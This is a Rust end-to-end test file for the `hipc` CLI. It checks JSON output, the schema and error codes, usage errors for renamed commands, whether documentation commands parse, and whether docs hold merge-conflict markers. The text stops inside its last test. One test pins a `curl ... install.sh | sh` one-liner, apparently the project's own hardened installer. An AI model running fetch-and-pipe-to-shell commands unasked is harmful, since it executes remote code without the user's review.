//! End-to-end checks of the machine contract (`TENETS.md` tenets 2, 3, 4 and 7) for the
//! commands that need no network. Each test spawns the built `hipc` binary. Two more checks
//! are about documentation: the `hipc` commands `README.md` shows are in `hipc schema` and
//! parse, and no top-level doc holds a merge conflict marker.
//!
//! These tests always pipe stdout, so `auto` mode is JSON in all of them. How the mode
//! depends on `CI`, `AI_AGENT`, and a terminal is unit-tested in `src/output.rs`, where
//! they are inputs, and at a real terminal in `tests/e2e/prompt.rs`.

use std::collections::BTreeSet;
use std::process::{Command, Output, Stdio};

use serde_json::Value;

use crate::common::{self, Home, VM};

/// The `hipc` binary in the clean environment of `common::command`, with its own home, which
/// the caller keeps alive until the run ends. These tests need the raw `Output` or their
/// own stdout, so they do not go through `Hipc`.
fn clean() -> (Home, Command) {
    let home = Home::new();
    let command = common::command(&home);
    (home, command)
}

/// Runs `hipc` with stdout and stderr piped, in the clean environment.
fn hipc(args: &[&str]) -> Output {
    let (_home, mut command) = clean();
    common::finished(
        command
            .args(args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped()),
    )
}

fn json(bytes: &[u8]) -> Value {
    serde_json::from_slice(bytes).expect("output is one JSON document")
}

fn text(bytes: &[u8]) -> &str {
    std::str::from_utf8(bytes).expect("output is UTF-8")
}

/// Asserts the tenet 4 failure shape: the exit code, empty stdout, and exactly one JSON
/// object on one line of stderr with this `code`. Returns the error object.
fn assert_json_error(out: &Output, exit: i32, code: &str) -> Value {
    assert_eq!(out.status.code(), Some(exit), "{}", text(&out.stderr));
    assert_eq!(text(&out.stdout), "");
    let stderr = text(&out.stderr);
    assert_eq!(stderr.lines().count(), 1, "{stderr}");
    assert!(stderr.ends_with('\n'));
    let error = json(stderr.as_bytes());
    assert_eq!(error["error"]["code"], code);
    assert_eq!(error["error"]["side_effects"], "none");
    assert_eq!(error["error"]["retryable"], false);
    assert!(
        error["error"]["message"]
            .as_str()
            .is_some_and(|m| !m.is_empty())
    );
    error
}

#[test]
fn version_on_a_pipe_is_json() {
    let out = hipc(&["version"]);
    assert_eq!(out.status.code(), Some(0));
    assert_eq!(text(&out.stderr), "");
    let doc = json(&out.stdout);
    assert_eq!(doc["version"], env!("CARGO_PKG_VERSION"));
    let target = doc["target"].as_str().unwrap();
    // A target triple: architecture first, then at least vendor and OS.
    assert!(target.starts_with(std::env::consts::ARCH), "{target}");
    assert!(target.split('-').count() >= 3, "{target}");
    assert_eq!(doc.as_object().unwrap().len(), 2);
}

#[test]
fn json_flag_and_output_json_are_the_same_document() {
    let flag = hipc(&["--json", "version"]);
    let after = hipc(&["version", "--json"]);
    let output = hipc(&["--output", "json", "version"]);
    let equals = hipc(&["--output=json", "version"]);
    for out in [&flag, &after, &output, &equals] {
        assert_eq!(out.status.code(), Some(0));
    }
    assert_eq!(flag.stdout, output.stdout);
    assert_eq!(after.stdout, output.stdout);
    assert_eq!(equals.stdout, output.stdout);
}

#[test]
fn output_text_wins_over_the_pipe() {
    let out = hipc(&["version", "--output", "text"]);
    assert_eq!(out.status.code(), Some(0));
    let stdout = text(&out.stdout);
    assert!(stdout.contains(env!("CARGO_PKG_VERSION")), "{stdout}");
    assert!(serde_json::from_str::<Value>(stdout).is_err(), "{stdout}");
}

#[test]
fn schema_lists_every_command_with_its_bits() {
    let out = hipc(&["schema"]);
    assert_eq!(out.status.code(), Some(0));
    let doc = json(&out.stdout);
    assert_eq!(doc["schema_version"], 4);
    let commands = doc["commands"].as_array().unwrap();
    let paths: Vec<String> = commands
        .iter()
        .map(|c| {
            let words: Vec<&str> = c["path"]
                .as_array()
                .unwrap()
                .iter()
                .map(|w| w.as_str().unwrap())
                .collect();
            words.join(" ")
        })
        .collect();
    for expected in [
        "version",
        "schema",
        "completions",
        "auth login",
        "account use",
        "api",
    ] {
        assert!(
            paths.iter().any(|p| p == expected),
            "{expected} missing from {paths:?}"
        );
    }
    for command in commands {
        let fields: Vec<&str> = command
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(
            fields,
            [
                "path",
                "effect",
                "confirmation",
                "reveal",
                "pagination",
                "confirmation_when",
                "reveal_when",
                "refused_when",
                "guards",
                "args",
                "flags",
                "required_groups",
                "routes"
            ]
        );
        assert!(command["guards"].is_array(), "{command}");
        let effect = command["effect"].as_str().unwrap();
        assert!(
            ["read_only", "idempotent", "non_idempotent"].contains(&effect),
            "{effect}"
        );
        for bit in ["confirmation", "reveal", "pagination"] {
            assert!(command[bit].is_boolean(), "{bit}");
        }
    }
}

/// `guards` names each exit-2 refusal that a write's own flag gets past, on every command
/// that makes it: `--remove-others`, `--public`, Hub's `--replace`, and `hipc api`'s
/// `--change-isolation`.
#[test]
fn schema_guards_name_each_refusal_a_flag_of_the_command_gets_past() {
    let doc = json(&hipc(&["schema"]).stdout);
    let commands = doc["commands"].as_array().unwrap();
    let guarded = |code: &str| -> Vec<String> {
        commands
            .iter()
            .filter(|c| {
                c["guards"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .any(|g| g["code"] == code)
            })
            .map(|c| {
                let path: Vec<&str> = c["path"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .map(|word| word.as_str().unwrap())
                    .collect();
                path.join(" ")
            })
            .collect()
    };
    assert_eq!(
        guarded("remove_others_required"),
        [
            "account members update",
            "s3 buckets acl update",
            "compute firewall update",
            "cdn rules update",
            "cdn waf rules update",
            "cdn waf rate-limits update",
            "cdn lists items update",
            "api",
        ]
    );
    assert_eq!(
        guarded("public_required"),
        [
            "s3 buckets acl update",
            "hub namespace update",
            "cdn zones create",
            "cdn zones update",
            "api"
        ]
    );
    assert_eq!(guarded("replace_required"), ["hub subscription subscribe"]);
    // `hipc api`'s own route flag is a guard like the others, with its own code.
    assert_eq!(guarded("change_isolation_required"), ["api"]);
    let hub = commands
        .iter()
        .find(|c| c["path"] == serde_json::json!(["hub", "subscription", "subscribe"]))
        .unwrap();
    assert_eq!(hub["guards"][0]["flag"], "--replace");
    assert!(
        hub["guards"][0]["when"]
            .as_str()
            .unwrap()
            .contains("in the last 10 minutes"),
        "{hub}"
    );
    // A list replace refuses more than a left-out rule, and the `when` says so, as the help
    // of `--remove-others` does.
    let when = |path: [&str; 3]| -> &str {
        commands
            .iter()
            .find(|c| c["path"] == serde_json::json!(path))
            .unwrap()["guards"][0]["when"]
            .as_str()
            .unwrap()
    };
    assert_eq!(
        when(["compute", "firewall", "update"]),
        "the rules file leaves out a rule the VM has now, or changes its protocol, ports, sources, \
         or enabled flag, in either direction; a missing enabled counts as true"
    );
    assert_eq!(
        when(["cdn", "rules", "update"]),
        "the rules file leaves out or moves a rule the zone has now"
    );
}

/// `hipc schema` lists every error code with its exit code, so an agent learns the table of
/// tenet 4 from the binary.
#[test]
fn schema_lists_every_error_code_with_its_exit_code() {
    let doc = json(&hipc(&["schema"]).stdout);
    let errors = doc["errors"].as_array().unwrap();
    let codes: Vec<(&str, u64)> = errors
        .iter()
        .map(|e| (e["code"].as_str().unwrap(), e["exit"].as_u64().unwrap()))
        .collect();
    assert_eq!(codes.len(), 26);
    assert_eq!(codes[0], ("usage", 2));
    assert!(codes.contains(&("replace_required", 2)), "{codes:?}");
    assert!(codes.contains(&("remove_others_required", 2)), "{codes:?}");
    assert!(codes.contains(&("public_required", 2)), "{codes:?}");
    assert!(
        codes.contains(&("change_isolation_required", 2)),
        "{codes:?}"
    );
    assert!(codes.contains(&("owner_only", 1)), "{codes:?}");
    // Its fix is a flag, `--account self`, so the caller must change the invocation.
    assert!(
        codes.contains(&("account_scope_unsupported", 2)),
        "{codes:?}"
    );
    for error in errors {
        let fields: Vec<&str> = error
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(fields, ["code", "exit", "meaning", "flag"]);
        let flagged = error["flag"].is_string();
        let names_one = error["exit"] == 2 && error["code"] != "usage";
        assert_eq!(flagged, names_one, "{error}");
    }
}

#[test]
fn schema_is_json_even_in_text_mode() {
    let text_mode = hipc(&["--output", "text", "schema"]);
    let json_mode = hipc(&["schema"]);
    assert_eq!(text_mode.status.code(), Some(0));
    assert_eq!(text_mode.stdout, json_mode.stdout);
    json(&text_mode.stdout);
}

/// `hipc schema <PATH>...` prints the whole document's fields, with `commands` cut to the
/// ones under the path, in the same order, and an unknown name is `usage` with a nearest
/// name to try.
#[test]
fn schema_with_a_path_lists_only_the_commands_under_it() {
    let whole = json(&hipc(&["schema"]).stdout);
    let out = hipc(&["schema", "compute", "app-engine"]);
    assert_eq!(out.status.code(), Some(0), "{}", text(&out.stderr));
    let part = json(&out.stdout);
    for field in ["schema_version", "global_flags", "errors"] {
        assert_eq!(part[field], whole[field], "{field}");
    }
    let under: Vec<&Value> = whole["commands"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|c| c["path"][0] == "compute" && c["path"][1] == "app-engine")
        .collect();
    assert!(under.len() > 1);
    assert_eq!(
        part["commands"]
            .as_array()
            .unwrap()
            .iter()
            .collect::<Vec<_>>(),
        under
    );

    // A path does not change the mode rule: the schema is JSON in text mode too.
    let text_mode = hipc(&["--output", "text", "schema", "compute", "app-engine"]);
    assert_eq!(text_mode.stdout, out.stdout);

    let leaf = json(&hipc(&["schema", "s3", "buckets", "create"]).stdout);
    assert_eq!(leaf["commands"].as_array().unwrap().len(), 1);
    assert_eq!(
        leaf["commands"][0]["path"],
        serde_json::json!(["s3", "buckets", "create"])
    );

    for (args, hint) in [
        (
            &["schema", "compute", "vm"][..],
            "run `hipc schema compute vms`",
        ),
        (
            &["schema", "app-engine"][..],
            "run `hipc schema compute app-engine`",
        ),
        (
            &["schema", "s3", "buckets", "create", "x"][..],
            "run `hipc schema s3 buckets create`",
        ),
        (
            &["schema", ""][..],
            "run `hipc schema` with one of the commands it holds",
        ),
    ] {
        let out = hipc(args);
        assert_eq!(out.status.code(), Some(2), "{args:?}");
        assert!(out.stdout.is_empty(), "{args:?}");
        let error = json(text(&out.stderr).trim().lines().last().unwrap().as_bytes());
        assert_eq!(error["error"]["code"], "usage", "{args:?}");
        let got = error["error"]["hint"].as_str().unwrap();
        // The house voice of tenet 15: no second person, one sentence, literals quoted.
        common::assert_voice(error["error"]["message"].as_str().unwrap());
        common::assert_voice(got);
        assert!(got.starts_with(hint), "{args:?}: {got}");
    }
}

/// The repository README, read at compile time so an edit to it rebuilds this test.
const README: &str = include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../README.md"));

/// The pages that show `hipc` commands and are held to the same scan as the README (tenet
/// 16): the generated reference is the help itself, and the user journeys show flags before
/// the path, so neither is here.
const COMMAND_PAGES: [(&str, &str); 3] = [
    ("README.md", README),
    (
        "docs/getting-started.md",
        include_str!(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../docs/getting-started.md"
        )),
    ),
    (
        "docs/agents.md",
        include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../docs/agents.md")),
    ),
];

/// Each page that shows the install one-liner shows the one the script's header gives, `-q`
/// first, so `~/.curlrc` cannot turn on `insecure`, and no redirect can drop to plain HTTP
/// before the script runs and checks the tarball.
#[test]
fn the_install_one_liner_is_the_scripts_own() {
    let script = include_str!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../scripts/install.sh"
    ));
    let curl = "curl -q --proto '=https' --tlsv1.2 -fsSL";
    let url = "https://github.com/thenervelab/hippius-cli/releases/latest/download/install.sh";
    assert!(script.contains(&format!("#   url={url}\n")));
    assert!(script.contains(&format!("#   {curl} \"$url\" | sh\n")));
    let line = format!("{curl} {url} | sh");
    for (page, text) in COMMAND_PAGES {
        let shown: Vec<&str> = text
            .lines()
            .filter(|l| l.contains("install.sh") && l.contains("curl"))
            .collect();
        assert_eq!(shown, [line.as_str()], "{page}");
    }
}

/// Every command path `hipc schema` lists, each as its words joined by one space.
fn schema_paths() -> BTreeSet<String> {
    let doc = json(&hipc(&["schema"]).stdout);
    let commands = doc["commands"].as_array().expect("the schema has commands");
    commands
        .iter()
        .map(|command| {
            let words = command["path"].as_array().expect("a path is an array");
            let words: Vec<&str> = words
                .iter()
                .map(|w| w.as_str().expect("a path word is a string"))
                .collect();
            words.join(" ")
        })
        .collect()
}

/// Shell words that end the arguments of a `hipc` command in the README.
const SHELL_OPERATORS: [&str; 6] = ["|", "||", "&&", ";", ">", ">>"];

/// Each `hipc` command in `readme`, as the text it was read from and its arguments: every
/// command on a line of a fenced code block, and every command in an inline code span
/// outside one. A command with no arguments is skipped, because a bare `hipc` names the
/// binary, not a command.
fn readme_commands(readme: &str) -> Vec<(&str, Vec<&str>)> {
    let mut in_block = false;
    let mut commands = Vec::new();
    for line in readme.lines() {
        if line.trim_start().starts_with("```") {
            in_block = !in_block;
        } else if in_block {
            commands.extend(commands_in(line).into_iter().map(|args| (line, args)));
        } else {
            // Split on backticks, the odd pieces are the inline code spans.
            for span in line.split('`').skip(1).step_by(2) {
                commands.extend(commands_in(span).into_iter().map(|args| (span, args)));
            }
        }
    }
    commands
}

/// The arguments of each `hipc` command in `text`. A word `hipc` starts a command, also after
/// `(` or `$(`, so the README names the binary file `./hipc`. Its arguments are the words
/// after it, up to a shell operator, a `#` comment, or a word that ends in `)` or `;`,
/// which closes a subshell or the command.
fn commands_in(text: &str) -> Vec<Vec<&str>> {
    let words: Vec<&str> = text.split_whitespace().collect();
    let mut commands = Vec::new();
    for (i, word) in words.iter().enumerate() {
        if word.trim_start_matches(['$', '(']) != "hipc" {
            continue;
        }
        let mut args = Vec::new();
        for word in &words[i + 1..] {
            if SHELL_OPERATORS.contains(word) || word.starts_with('#') {
                break;
            }
            let arg = word.trim_end_matches([')', ';']);
            args.push(arg);
            if arg.len() < word.len() {
                break;
            }
        }
        if !args.is_empty() {
            commands.push(args);
        }
    }
    commands
}

/// The repository's prose files, read at compile time. A merge that leaves conflict markers
/// in Rust fails to build, but one in a Markdown file passed every test once, so they are
/// checked here.
const DOCS: [(&str, &str); 5] = [
    ("README.md", README),
    (
        "TENETS.md",
        include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../TENETS.md")),
    ),
    (
        "CHANGELOG.md",
        include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../CHANGELOG.md")),
    ),
    (
        "CONTRIBUTING.md",
        include_str!(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../CONTRIBUTING.md"
        )),
    ),
    (
        "SECURITY.md",
        include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../SECURITY.md")),
    ),
];

/// The 1-based line numbers of `text` that open or close a merge conflict. The `=======`
/// separator is left out, because a Markdown setext heading underline can be that line.
fn conflict_marker_lines(text: &str) -> Vec<usize> {
    text.lines()
        .enumerate()
        .filter(|(_, line)| line.starts_with("<<<<<<< ") || line.starts_with(">>>>>>> "))
        .map(|(index, _)| index + 1)
        .collect()
}

#[test]
fn no_document_holds_a_merge_conflict_marker() {
    // Every doc is checked before the assert, so one run names every file a bad merge hit.
    let found: Vec<_> = DOCS
        .iter()
        .map(|(name, text)| (name, conflict_marker_lines(text)))
        .filter(|(_, lines)| !lines.is_empty())
        .collect();
    assert!(
        found.is_empty(),
        "merge conflict markers (file, lines): {found:?}"
    );
}

#[test]
fn a_conflict_marker_is_found_and_a_heading_underline_is_not() {
    let text = "# A\n\nB\n=======\n<<<<<<< HEAD\nours\n=======\ntheirs\n>>>>>>> origin/main\n";
    assert_eq!(conflict_marker_lines(text), [5, 9]);
    assert_eq!(
        conflict_marker_lines("Title\n=======\n"),
        Vec::<usize>::new()
    );
}

/// Every `hipc` command the README, `docs/getting-started.md`, and `docs/agents.md` show, in
/// a code block or an inline code span, starts with a command path of `hipc schema`, and `hipc`
/// parses it, so a rename that forgets a page fails here. The parse runs the command with
/// `--help`, which reads no file and touches no network, and fails on a word the command
/// does not take, such as the old `show` after `hipc billing stripe`. A stale word that the
/// command takes as a positional argument still parses; only the path and the flags are
/// checked. A page may not show a global flag before the path, or a placeholder in it.
#[test]
fn readme_commands_start_with_a_schema_path_and_parse() {
    let paths = schema_paths();
    let mut found = BTreeSet::new();
    for (page, markdown) in COMMAND_PAGES {
        for (source, args) in readme_commands(markdown) {
            let source = source.trim();
            let line = args.join(" ");
            // The longest path, so `hipc compute vms list` is not read as a shorter one.
            let path = (1..=args.len())
                .rev()
                .map(|n| args[..n].join(" "))
                .find(|path| paths.contains(path));
            let Some(path) = path else {
                panic!(
                    "{page} `{source}`: `hipc {line}` starts with no `hipc schema` path \
                     (a renamed command, or a flag before the path)"
                );
            };
            found.insert((page, path));

            let out = hipc(&[args.as_slice(), &["--help"]].concat());
            assert_eq!(
                out.status.code(),
                Some(0),
                "{page} `{source}`: `hipc {line}` does not parse: {}",
                text(&out.stderr)
            );
        }
    }

    // A scan that stopped finding a page's commands would pass with nothing to check.
    let anchors = [
        ("README.md", "auth login"),
        ("README.md", "auth status"),
        ("README.md", "billing transactions"),
        ("README.md", "schema"),
        ("README.md", "completions"),
        ("README.md", "api"),
        ("docs/getting-started.md", "auth login"),
        ("docs/getting-started.md", "account use"),
        ("docs/getting-started.md", "completions"),
        ("docs/agents.md", "schema"),
        ("docs/agents.md", "auth login"),
        ("docs/agents.md", "api"),
    ];
    for (page, expected) in anchors {
        assert!(
            found.contains(&(page, expected.to_owned())),
            "{page} shows no `hipc {expected}`"
        );
    }
}

/// The README scan reads every command on a fenced line, after `(` and `$(` too, and the
/// commands of inline code spans outside fences, skipping a bare `hipc`; arguments end at a
/// shell operator, a comment, or a word that ends in `)` or `;`.
#[test]
fn readme_commands_reads_fences_and_inline_spans() {
    // After the first line, each line ends a command on one stop alone: `|`, `>`, a
    // closing `)`, `#`, `&&`, a trailing `;`, `>>`, `||`, and a bare `;`.
    let readme = "run `hipc schema` or `hipc`, not hipc account\n```sh\n\
                  hipc auth login --token-file x | hipc schema > out\n\
                  echo $(hipc account) (hipc --json schema) ./hipc\n\
                  hipc version # note\n\
                  hipc version && hipc schema\n\
                  hipc schema; hipc auth status >> log\n\
                  hipc account || hipc account ; hipc\n```\n";
    let commands: Vec<Vec<&str>> = readme_commands(readme)
        .into_iter()
        .map(|(_, args)| args)
        .collect();
    let expected: [&[&str]; 12] = [
        &["schema"],
        &["auth", "login", "--token-file", "x"],
        &["schema"],
        &["account"],
        &["--json", "schema"],
        &["version"],
        &["version"],
        &["schema"],
        &["schema"],
        &["auth", "status"],
        &["account"],
        &["account"],
    ];
    assert_eq!(commands, expected);
}

#[test]
fn unknown_flag_on_a_pipe_is_one_json_usage_error() {
    let error = assert_json_error(&hipc(&["version", "--bogus"]), 2, "usage");
    assert_eq!(
        error["error"]["message"],
        "unexpected argument `--bogus` found"
    );
    assert_eq!(error["error"]["hint"], "run `hipc version --help`");
    assert_json_error(&hipc(&["--bogus", "version"]), 2, "usage");
}

/// The renamed commands' old names are gone, with no alias: a clean break before 1.0, so each old
/// spelling is a usage error before anything is read or sent.
#[test]
fn old_command_names_are_usage_errors() {
    let old: [&[&str]; 9] = [
        &["account", "show"],
        &["billing", "stripe", "show"],
        &["drive", "subscription", "show"],
        &["s3", "subscription", "show"],
        &["hub", "subscription", "show"],
        &["hub", "namespace", "me"],
        &["compute", "runners", "settings", "show"],
        &["compute", "public-ips", "get", "vm_1"],
        &["cdn", "purge", "zab12cd34ef56", "--all"],
    ];
    for argv in old {
        assert_json_error(&hipc(argv), 2, "usage");
    }
}

/// The commands renamed for tenet 2 kept no alias, and the hints that named their new paths
/// are gone since 0.16.0: each old command line is a plain `usage` error whose hint is the
/// help of the group it reached, and the new line dry-runs the request. A leaf that became a
/// group (holding `list`, or `get` for the Hub robot) is the same whether the old line had an
/// id, a flag first, a global flag before the path, or nothing after it.
#[test]
fn old_command_paths_are_plain_usage_errors() {
    // The old command line, the new one, and the URL the new one sends.
    let cases = [
        (
            "hub namespace provision acme --reveal --yes",
            "hub namespace create acme --reveal --yes",
            "/api/registry/provision/",
        ),
        (
            "hub namespace check acme",
            "hub namespace availability acme",
            "/api/registry/namespaces/check/?name=acme",
        ),
        (
            "network groups",
            "network groups list",
            "/api/network/groups/",
        ),
        (
            "network policies",
            "network policies list",
            "/api/network/policies/",
        ),
        (
            "network vpcs resources 3",
            "network vpcs resources list 3",
            "/api/network/networks/3/resources/",
        ),
        (
            "network vpcs routers 3",
            "network vpcs routers list 3",
            "/api/network/networks/3/routers/",
        ),
        (
            "compute kubernetes backups 7 --reveal",
            "compute kubernetes backups list 7 --reveal",
            "/api/kubernetes/clusters/7/backups/",
        ),
        (
            "compute kubernetes backups --reveal 7",
            "compute kubernetes backups list --reveal 7",
            "/api/kubernetes/clusters/7/backups/",
        ),
        (
            "--output json network groups",
            "--output json network groups list",
            "/api/network/groups/",
        ),
        (
            "hub namespace robot",
            "hub namespace robot get",
            "/api/registry/me/robot/",
        ),
    ];
    for (old, new, url) in cases {
        let mut argv: Vec<&str> = old.split_whitespace().collect();
        argv.push("--dry-run");
        let doc = assert_json_error(&hipc(&argv), 2, "usage");
        // The group the old line reached: the new path less its last word.
        let group = new
            .split_whitespace()
            .filter(|word| !word.starts_with('-') && *word != "json")
            .take_while(|word| !["create", "availability", "list", "get"].contains(word))
            .collect::<Vec<_>>()
            .join(" ");
        assert_eq!(
            doc["error"]["hint"],
            format!("run `hipc {group} --help`"),
            "{old}"
        );
        let mut argv: Vec<&str> = new.split_whitespace().collect();
        argv.push("--dry-run");
        let run = hipc(&argv);
        assert_eq!(run.status.code(), Some(0), "{new}: {}", text(&run.stderr));
        assert!(
            json(&run.stdout)["requests"][0]["url"]
                .as_str()
                .is_some_and(|sent| sent.ends_with(url)),
            "{new}: {}",
            text(&run.stdout)
        );
    }
}

/// The old leaf given the id `list` (a VPC network may be named `list`) parses as the new
/// leaf without its id, a plain missing argument whose hint is that command's help.
#[test]
fn a_new_list_without_its_id_is_sent_to_its_help() {
    for (argv, hint) in [
        (
            &["network", "vpcs", "routers", "list"][..],
            "run `hipc network vpcs routers list --help`",
        ),
        (
            &["network", "vpcs", "resources", "list"],
            "run `hipc network vpcs resources list --help`",
        ),
        (
            &["compute", "kubernetes", "backups", "list", "--reveal"],
            "run `hipc compute kubernetes backups list --help`",
        ),
    ] {
        let doc = assert_json_error(&hipc(argv), 2, "usage");
        assert_eq!(doc["error"]["hint"], hint, "{argv:?}");
    }
    // The new line with the id `list` is a request for that VPC network.
    let run = hipc(&["network", "vpcs", "routers", "list", "list", "--dry-run"]);
    assert_eq!(run.status.code(), Some(0), "{}", text(&run.stderr));
    assert!(
        text(&run.stdout).contains("/networks/list/routers/"),
        "{}",
        text(&run.stdout)
    );
}

/// An unknown word under a group, a word after `list`, a shelf verb under an old leaf now a
/// group, an unknown flag, or a missing argument gets the plain help hint. In text mode the
/// old leaf, now a group, prints its help after the hint, as every line that stops before a
/// subcommand does.
#[test]
fn an_unknown_word_or_flag_gets_the_help_hint() {
    for (argv, path) in [
        (
            &["hub", "namespace", "provisions", "acme"][..],
            "hipc hub namespace",
        ),
        (
            &["hub", "namespace", "status", "extra"],
            "hipc hub namespace status",
        ),
        (
            &["network", "groups", "list", "extra"],
            "hipc network groups list",
        ),
        (&["hub", "namespace", "create"], "hipc hub namespace create"),
        (&["network", "peers", "get"], "hipc network peers get"),
        (
            &["compute", "kubernetes", "backups", "delete", "7"],
            "hipc compute kubernetes backups",
        ),
        (&["network", "groups", "get", "3"], "hipc network groups"),
        (
            &["hub", "namespace", "robot", "delete"],
            "hipc hub namespace robot",
        ),
        (&["network", "vpcs", "9"], "hipc network vpcs"),
        // A word under a moved leaf whose new leaf takes no id is not the old leaf's id.
        (&["network", "groups", "7"], "hipc network groups"),
        (
            &["account", "notifications", "frob"],
            "hipc account notifications",
        ),
        (
            &["hub", "namespace", "robot", "foo"],
            "hipc hub namespace robot",
        ),
        // An unknown flag the new leaf does not take would fail again under it.
        (
            &["network", "groups", "--limit", "5"],
            "hipc network groups",
        ),
        (
            &["account", "notifications", "--frob"],
            "hipc account notifications",
        ),
        (
            &["account", "notifications", "-x"],
            "hipc account notifications",
        ),
        (
            &["hub", "namespace", "robot", "--reveal"],
            "hipc hub namespace robot",
        ),
        (
            &["compute", "kubernetes", "backups", "--frob", "7"],
            "hipc compute kubernetes backups",
        ),
    ] {
        let doc = assert_json_error(&hipc(argv), 2, "usage");
        assert_eq!(
            doc["error"]["hint"],
            format!("run `{path} --help`"),
            "{argv:?}"
        );
    }
    let run = hipc(&["--output", "text", "network", "policies"]);
    assert_eq!(run.status.code(), Some(2));
    let stderr = text(&run.stderr);
    assert!(
        stderr.starts_with(
            "error: a subcommand is required; `hipc network policies` holds `list`\nhint: run \
             `hipc network policies --help`\n\n"
        ),
        "{stderr}"
    );
    assert!(stderr.contains("Usage: hipc network policies"), "{stderr}");
}

/// The flags renamed before 1.0 kept no alias, so each old spelling is a `usage` error that
/// names the word it does not know, with the command's help as its hint (the hint that named
/// the new flag is gone since 0.16.0), and the new spelling of the same command parses.
#[test]
fn old_flag_names_are_usage_errors() {
    // The old command line, how many of its words name the command, the word it no longer
    // takes, and what replaces that word and its value.
    let cases = [
        (
            "cdn estimate --custom-domains 1",
            2,
            "--custom-domains",
            "--custom-hostnames 1",
        ),
        (
            "s3 configure --from-token-json t.json",
            2,
            "--from-token-json",
            "--from-token-file t.json",
        ),
        (
            "cdn waf events zab12cd34ef56 --rule r1",
            3,
            "--rule",
            "--rule-id r1",
        ),
        (
            "api POST /accounts/ --input b.json",
            1,
            "--input",
            "--body-file b.json",
        ),
        ("hub subscription subscribe Pro", 3, "Pro", "--plan Pro"),
        (
            "drive subscription change --funding card",
            3,
            "--funding",
            "--pay-from card",
        ),
        (
            "s3 subscription change --funding card",
            3,
            "--funding",
            "--pay-from card",
        ),
        (
            "cdn purges create zab12cd34ef56 --all",
            3,
            "--all",
            "--everything",
        ),
        (
            "s3 subscription change --storage-cap-bytes 1",
            3,
            "--storage-cap-bytes",
            "--storage-cap 1",
        ),
        (
            "hub keys create --name ci --role read --expires-days 1",
            3,
            "--expires-days",
            "--expires-in 1",
        ),
        (
            "account billing-accounts costs default --group day",
            3,
            "--group",
            "--group-by day",
        ),
        (
            "compute backups restore vm-1 --point r1",
            3,
            "--point",
            "--run-id r1",
        ),
        ("cdn estimate --gb FR=1", 2, "--gb", "--traffic FR=1"),
        (
            "drive subscription change --storage-cap-bytes 1",
            3,
            "--storage-cap-bytes",
            "--storage-cap 1",
        ),
    ];
    for (old, words, word, new) in cases {
        let mut argv: Vec<&str> = old.split_whitespace().collect();
        argv.push("--dry-run");
        let doc = assert_json_error(&hipc(&argv), 2, "usage");
        let message = doc["error"]["message"].as_str().unwrap_or_default();
        assert!(message.contains(&format!("`{word}`")), "{old}: {message}");
        // The help of the command typed, its words before the first argument.
        let command = old
            .split_whitespace()
            .take(words)
            .collect::<Vec<_>>()
            .join(" ");
        assert_eq!(
            doc["error"]["hint"],
            format!("run `hipc {command} --help`"),
            "{old}"
        );
        // `--help` after a complete parse prints the help; an argument clap refuses is an
        // error before it, so the new spelling exits 0.
        let new = old.replacen(&word_and_value(old, word), new, 1);
        let mut argv: Vec<&str> = new.split_whitespace().collect();
        argv.push("--help");
        let run = hipc(&argv);
        assert_eq!(run.status.code(), Some(0), "{new}: {}", text(&run.stderr));
    }
}

/// `word` with the value after it in `line`, or alone when it is a switch or a positional
/// argument (the last word).
fn word_and_value(line: &str, word: &str) -> String {
    let words: Vec<&str> = line.split_whitespace().collect();
    let at = words
        .iter()
        .position(|w| *w == word)
        .expect("the word is in the line");
    match words.get(at + 1) {
        Some(value) if word.starts_with("--") => format!("{word} {value}"),
        _ => word.to_owned(),
    }
}

#[test]
fn argv_errors_of_every_kind_are_json_usage_errors() {
    let cases: [(&[&str], &str); 9] = [
        (
            &[],
            "a subcommand is required; `hipc` holds `version`, `status`, `schema`, \
             `completions`, `auth`, `account`, `billing`, `drive`, `s3`, `hub`, `compute`, \
             `cdn`, `support`, `network`, and `api`",
        ),
        (
            &["nope"],
            "`hipc` has no command `nope`; it holds `version`, `status`, `schema`, \
             `completions`, `auth`, `account`, `billing`, `drive`, `s3`, `hub`, `compute`, \
             `cdn`, `support`, `network`, and `api`",
        ),
        (
            &["completions"],
            "the following required arguments were not provided: `<SHELL>`",
        ),
        (
            &["completions", "tcsh"],
            "invalid value `tcsh` for `<SHELL>` \
             [possible values: `bash`, `elvish`, `fish`, `powershell`, `zsh`]",
        ),
        (
            &["--output", "yaml", "version"],
            "invalid value `yaml` for `--output <OUTPUT>` \
             [possible values: `auto`, `text`, `json`]",
        ),
        (
            &["--output", "json", "--output", "json", "version"],
            "the argument `--output <OUTPUT>` cannot be used multiple times",
        ),
        (
            &["--json", "--output", "text", "version"],
            "the argument `--json` cannot be used with `--output <OUTPUT>`",
        ),
        (&["version", "extra"], "unexpected argument `extra` found"),
        (&["-v", "version"], "unexpected argument `-v` found"),
    ];
    for (args, message) in cases {
        let error = assert_json_error(&hipc(args), 2, "usage");
        assert_eq!(error["error"]["message"], message, "{args:?}");
    }
}

#[test]
fn a_global_given_at_two_command_levels_is_a_usage_error() {
    let cases: [(&[&str], &str); 5] = [
        // The error prints in the mode clap settled on, the last one given, so each
        // case ends on JSON.
        (
            &["--output", "text", "version", "--json"],
            "`--output` or `--json` is given more than once",
        ),
        (
            &["--output=text", "version", "--output", "json"],
            "`--output` or `--json` is given more than once",
        ),
        (
            &["--profile", "a", "auth", "status", "--profile", "b"],
            "`--profile` is given more than once",
        ),
        (
            &["--account=self", "account", "get", "--account", "self"],
            "`--account` is given more than once",
        ),
        (
            &[
                "--request-timeout",
                "5",
                "version",
                "--request-timeout",
                "6",
            ],
            "`--request-timeout` is given more than once",
        ),
    ];
    for (args, message) in cases {
        let run = hipc(args);
        assert!(run.stdout.is_empty(), "{args:?}");
